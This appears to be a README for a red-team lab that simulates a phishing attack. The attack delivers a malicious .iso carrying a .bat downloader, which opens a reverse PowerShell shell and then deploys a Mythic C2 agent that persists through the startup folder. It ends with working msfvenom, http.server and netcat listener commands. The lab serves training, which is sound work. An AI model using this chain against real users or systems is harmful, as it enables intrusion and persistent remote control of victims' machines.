# 🎯 Phishing and C2 Control Lab

This lab simulates a real-world phishing attack delivering a malicious `.iso` file, which ultimately leads to reverse shell access and persistence via a C2 (Command & Control) framework — **Mythic**. It covers Red Team tactics from payload creation to post-exploitation persistence.

---

## 🧰 Tools Used

- 🐧 Kali Linux
- 🪟 Windows 10 (victim)
- 🛠️ `msfvenom`, `netcat`, `python3 -m http.server`
- 🧱 Mythic C2 Framework
- 📄 Windows `.bat`, `.iso`, and PowerShell scripting

---

## 🧪 Lab Stages

### 🔹 Part 1: Pre-Attack Setup

- Crafted phishing email template
- Generated PowerShell reverse shell using `msfvenom`
- Created `.bat` downloader and zipped with decoy `.txt`
- Created `.iso` file using Windows ADK `oscdimg`

### 🔹 Part 2: Phishing Execution

- Victim receives phishing email with `.iso` attachment
- Upon mounting and executing, payload is downloaded
- Reverse shell connects back to attacker (Kali VM)

### 🔹 Part 3: Mythic C2 Deployment

- Installed and configured Mythic C2 on Kali
- Created a Windows payload using Apollo agent
- Delivered agent via reverse shell
- Achieved persistent access using startup folder drop

---

## ⚙️ Key Payload Commands

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.0.103 lport=1337 > reverse_shell.txt
python3 -m http.server
nc -lvnp 1337

